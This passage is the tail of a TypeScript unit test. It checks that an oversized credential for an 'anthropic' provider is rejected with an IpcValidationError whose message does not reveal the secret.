      parseSetCredentialPayload({ provider: "anthropic", key: `${secret}${"x".repeat(600)}` });
      expect.unreachable("an oversized credential must be rejected");
    } catch (error) {
      expect(error).toBeInstanceOf(IpcValidationError);
      expect((error as Error).message).not.toContain(secret);
    }
  });
});
